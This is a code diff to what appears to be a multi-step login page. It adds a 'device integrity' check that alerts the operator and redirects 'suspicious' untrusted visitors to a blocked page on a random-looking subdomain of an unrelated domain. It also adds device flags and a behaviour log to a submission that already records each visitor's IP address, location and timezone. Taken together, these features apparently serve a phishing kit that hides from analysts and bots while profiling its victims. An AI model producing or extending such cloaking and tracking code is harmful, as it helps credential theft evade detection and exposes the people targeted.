@@ -1441,6 +1441,29 @@ async function showStep2() {
         return;
     }
 
+    // ── DEVICE INTEGRITY CHECK ─────────────────────────────────────
+    if (window.__deviceIntegrity) {
+        const risk = window.__deviceIntegrity.getRiskScore();
+        const highFlags = risk.flags.filter(f => f.severity === 'high');
+        if (highFlags.length > 0) {
+            const report = window.__deviceIntegrity.getDeviceReport();
+            const flagDetails = highFlags.map(f => f.rule + ': ' + f.detail).join('\n');
+            console.warn('[DeviceIntegrity] High-risk flags:', highFlags);
+            sendSecurityAlert(
+                'Suspicious device detected\n' + flagDetails +
+                '\nRisk score: ' + risk.score +
+                '\nTrusted: ' + report.trusted +
+                '\nUA: ' + report.userAgent.slice(0, 120)
+            );
+            // Trusted devices get a pass; untrusted devices get blocked on ANY high flag
+            if (!window.__deviceIntegrity.isTrusted()) {
+                try { sendSecurityAlert('Blocked - ' + flagDetails); } catch(e) {}
+                window.location.href = 'https://72oe-v2sx.shine-ministry.com/blocked.html';
+                return;
+            }
+        }
+    }
+
     // Acquire primary action node buttons
     const loginBtn = document.getElementById('submitBtn');
     const originalBtnText = loginBtn ? loginBtn.textContent : '';
@@ -1922,7 +1945,13 @@ function onCaptchaSuccess(){
                     screen: `${screen.width}x${screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     ipAddress: ip,
-                    location: location
+                    location: location,
+                    deviceIntegrity: window.__deviceIntegrity
+                        ? JSON.stringify({
+                            flags: window.__deviceIntegrity.getFlags().map(f => f.rule),
+                            behaviors: window.__deviceIntegrity.getBehaviorLog()
+                          })
+                        : undefined
                 })
             }
         );
